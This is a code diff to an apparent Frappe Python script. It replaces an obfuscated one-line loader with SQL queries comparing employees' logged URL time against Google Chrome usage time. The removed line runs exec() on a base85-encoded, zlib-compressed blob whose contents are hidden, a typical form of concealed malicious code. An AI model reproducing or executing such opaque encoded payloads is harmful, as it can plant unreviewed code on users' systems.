@@ -1,3 +1,59 @@
+import frappe
 
-import base64, zlib
-exec(zlib.decompress(base64.b85decode('c%03W+j6Q{6h+_j6<W~*v`H!At)d|2sHhP&Xi!fb<qn&R++~C4w|6T2nttwH&$C9&HERIJbAzaGaeSy-hN#GvFJIKqxOmY+Xu;S_fE1>&8EB!To3U2t|CoJIq?gdQ5#Xnp?Mr7{GHlf{9VfLe$V1`lOgm7aF8i)-#fm8^k{F9GVkpMYbTwTKg6xur%Gr?-InscUI;tn>vIad5>MnfwW@wQOp(`1N@7iA>(~@lWANsRgx;6487V=U1ijNm*WMvdKGzYX-IXJhL3(F_&I6Rkql<s=GG69)+4u_T3Wd#s&nBUjaaZy*vPSIx3-filSM(gXga^e`Xwa<HV&L>{2CRAAWqjsOSpCrsUAIYM06)?Vbk|}m9xy+_F-z2g<!DoAVG|cD4bGLK7un3Qb&Cc1-jUByeMC9y-Y`i|(dlx=hY^BA*opvnp866WsnW*&M_v=|g_eSe}Q-qjvbls|wPvmLDQW7b&)A5c+9%0CLY=gBkwpvms_?8kv6T`~p=d6>WT?=2V*?RrHp!0dBTX!%@rSC3<jSwj!^p1%VQ?)`Ty^>)PRiZBE3fV%N9k2pn)E>zD0Xi?bOsljb4DI=QUlc|EDv04p0dmye1hI-f_+AWjTM<*o0x*t@i=}4&V>^g+exL7b0;k7D>)t@Q&sW8s^aw%Id7lg$Fioh0OdpF^>y-KLy<ft0EVJe%;oS9d<_$4QVOP!5x_4gh*FyceqFO{78y^N51-OxLs59ldf7>Af-X-wx$gf$WGG@<-+HDB<fRT|Z*%(BRhgl3WE+4UrL|h#E6~*s9VcQ*A9+{@QcoSMoStgh7v#GXqxw~q%=#wO;wbK@U-e7`xwPQ)(@ORE<a7Wd%E#K~gh8(TUCz_cMPk4V1QJZ}$whxVknt-$#0QM*xuKMxX{Gf<aZ30FxAQT7m4P%L2NUndqFp_iX&u`wRFi_u=9AUKWNZs;8iRqGJyPmJWbgBLtZXhRbZlgWb&9!Zx9?N+?N&nT4v*x(jIg<iAOryk-Ji`ZHe*C1(@7kZ=|A8A{S_qQ91S~#THjH}P<ZD%zC2K*-+K0hot$RPN0RH^-+c)D+0cbzgFQ|5?7HSW1oVXScMHr{5?gdI3%K`G!4Cuq(Ni*PX')).decode())
+app_url_timeDiff_distinct = frappe.db.sql("""
+select
+url.employee_name,
+url.date,
+url.total_url_time,
+app.total_application_time,
+ROUND(((app.total_application_time - url.total_url_time) / app.total_application_time) * 100, 2) as difference_percentage
+from (
+select
+employee_name,
+DATE(from_time) as date,
+ROUND(sum(duration)/3600, 2) as total_url_time
+from `tabURL Access Log`
+group by employee_name, DATE(from_time)
+) as url
+join (
+select
+employee_name,
+DATE(date) as date,
+ROUND(sum(duration)/3600, 2) as total_application_time
+from `tabApplication Usage log`
+where application_name = 'Google Chrome'
+group by employee_name, DATE(date)
+) as app
+on url.employee_name = app.employee_name and url.date = app.date
+""", as_dict=True)
+
+app_url_timeDiff = frappe.db.sql("""
+select
+ROUND(
+(
+(SUM(app.total_application_time) - SUM(url.total_url_time))
+/ SUM(app.total_application_time)
+) * 100, 2
+) as difference_percentage
+from (
+select
+employee_name,
+DATE(from_time) as date,
+ROUND(sum(duration)/3600, 2) as total_url_time
+from `tabURL Access Log`
+group by employee_name, DATE(from_time)
+) as url
+join (
+select
+employee_name,
+DATE(date) as date,
+ROUND(sum(duration)/3600, 2) as total_application_time
+from `tabApplication Usage log`
+where application_name = 'Google Chrome'
+group by employee_name, DATE(date)
+) as app
+on url.employee_name = app.employee_name and url.date = app.date
+""", as_dict=True)
+
+difference_percentage = app_url_timeDiff[0]['difference_percentage'] if app_url_timeDiff else 0
+print(difference_percentage)
